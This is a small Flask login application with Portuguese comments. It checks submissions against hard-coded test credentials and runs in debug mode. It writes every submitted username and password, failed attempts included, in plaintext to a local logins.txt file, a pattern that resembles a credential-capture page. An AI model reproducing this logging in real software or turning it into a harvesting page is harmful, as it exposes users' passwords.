from flask import Flask, render_template, request

app = Flask(__name__)

# Definir um nome de usuário e senha "fictícios" para validação
VALID_USERNAME = "usuario_teste"
VALID_PASSWORD = "senha_teste"

# Página de login (GET)
@app.route('/', methods=['GET'])
def login():
    return render_template('index.html')

# Página para processar o login (POST)
@app.route('/login', methods=['POST'])
def handle_login():
    # Coletar dados do formulário
    username = request.form['username']
    password = request.form['password']

    # Verificar se o nome de usuário e senha são válidos
    if username == VALID_USERNAME and password == VALID_PASSWORD:
        # Salvar os dados no arquivo de log
        with open("logins.txt", "a") as file:
            file.write(f"Nome de usuário: {username}, Senha: {password}\n")
        
        # Exibir a página de login com uma mensagem de sucesso
        return render_template('index.html', message="Login bem-sucedido!")
    
    # Se os dados estiverem incorretos, exibir "Senha incorreta"
    else:
        with open("logins.txt", "a") as file:
            file.write(f"Tentativa de login - Nome de usuário: {username}, Senha: {password}\n")
            return render_template('index.html', message="Senha incorreta.")


if __name__ == "__main__":
    app.run(debug=True)
